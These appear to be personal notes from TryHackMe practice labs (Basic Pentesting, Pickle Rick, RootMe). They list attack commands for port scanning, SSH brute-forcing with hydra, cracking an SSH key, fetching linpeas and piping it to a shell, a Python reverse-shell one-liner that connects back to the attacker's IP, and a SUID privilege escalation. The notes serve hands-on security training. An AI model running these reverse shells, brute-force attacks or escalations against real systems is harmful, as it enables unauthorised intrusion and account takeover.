# TryHackMe practice

## Basic Pentesting

```bash
# in host machine
# port scan
nmap -sC -sV -oN nmap/init {target IP}
# enumerate info
enum4linux -a {target IP} | tee enum4linux.log
# brute-forcing
hydra -l {user name} -P /usr/share/wordlists/rockyou.txt ssh://{target IP}

# Linux Privilege Escalation
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
scp ./linpeas.sh {user name}@{target IP}:/dev/shm
# or just run on the target machine
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

```bash
# in target machine
cd /dev/shm/
chmod +x linpeas.sh
./linpeas.sh
# SSH keys were found → copy [kay_id_rsa] content
```

```bash
# in host machine
# crack the password of SSH key
ssh2john kay_id_rsa > forjohn.txt
john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
# now login the target machine with passphrase
ssh -i kay_id_rsa {user name}@{target IP}
```

## Pickle Rick

```bash
nmap -sC -sV -oN nmap.log {target IP}
nikto -h http://{target IP} | tee nikto.log
gobuster dir -u http://10.10.131.195 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
```

```bash
# if 'cat' command is denied, it may allow use.
grep . clue.txt
# make sure that python can use.
python3 -c "print('hello')"

# use reverse shell
# https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my IP addr}",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
# show authority on current dir
sudo -l
```

## RootMe

```bash
# -sS: stealthly scan
# -sV: version detection
# -oN: output a log
sudo nmap -sS -sV -oN nmap.log {target IP}

# upload the reverse shell script
# https://github.com/pentestmonkey/php-reverse-shell

# execute this script for upgrade the reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'


find / -type f -user root -perm -4000 2>/dev/null

find / -user root -perm /4000 -type f 2>/dev/null

# escalate the priviledge
# ref) https://gtfobins.github.io/gtfobins/python/#suid
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
